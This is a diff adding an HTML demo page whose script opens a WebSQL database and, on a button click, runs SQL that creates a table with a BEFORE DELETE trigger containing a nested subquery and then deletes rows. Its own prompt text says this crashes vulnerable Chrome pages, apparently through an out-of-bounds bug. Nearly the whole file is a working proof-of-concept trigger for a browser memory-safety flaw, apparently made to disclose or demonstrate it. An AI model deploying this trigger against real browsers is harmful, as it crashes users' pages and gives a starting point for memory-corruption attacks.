@@ -1,0 +1,71 @@
+
+<button onClick="crash()" style="font-size: 150%">trigger</button>
+
+
+<script>
+const db = openDatabase('sakura', 1, 'oob', 5000000);
+
+const firstStatements = [
+"CREATE TABLE t0(c0 PRIMARY KEY, c1);",
+"CREATE TRIGGER trigger0 BEFORE DELETE ON t0 BEGIN SELECT ALL (SELECT c0, c1  FROM t0)  FROM t0 ;END ;",
+"DELETE FROM t0  ;",
+];
+
+function dbSuccess() {
+	console.log("success");
+	console.log(arguments);
+}
+
+function dbErr() {
+	console.log("err");
+	console.log(arguments);
+}
+
+function runAll(statements, success) {
+	db.transaction((tx) => {
+		console.log("alive");
+		for (const statement of statements) {
+			console.log("queueing " + statement);
+			tx.executeSql(statement, [], dbSuccess, dbErr);
+		}
+		console.log("queued");
+	}, dbErr, success);
+}
+function crash() {
+	runAll(firstStatements, (event) => {
+		console.log(event);
+	});
+}
+// onload
+function getChromeVersion(userAgent) {
+    for (const part of userAgent.split(" ")) {
+        if (part.startsWith("Chrome/") || part.startsWith("Chromium/")) {
+            return part.substring(part.indexOf("/") + 1);
+        }
+    }
+    return null;
+}
+function isChromeSupported(chromeVersion) {
+    if (chromeVersion == null) return false;
+    const firstPart = chromeVersion.substring(0, chromeVersion.indexOf("."));
+    return true;
+}
+function getPromptText(userAgent) {
+    const chromeVersion = getChromeVersion(userAgent);
+    if (chromeVersion == null) {
+        return "This demo only works on Chrome . Open this page in Chrome , then tap the button.";
+    }
+    const chromeOK = isChromeSupported(chromeVersion);
+    if (chromeOK) {
+        return "You're using Chrome , so you may be vulnerable. Tap the button to crash this page.";
+    }
+    return ".";
+}
+function onLoad() {
+    /*
+    document.getElementById("browserUserAgent").textContent = navigator.userAgent;
+    document.getElementById("prompttext").textContent = getPromptText(navigator.userAgent);
+    */
+}
+window.onload = onLoad;
+</script>
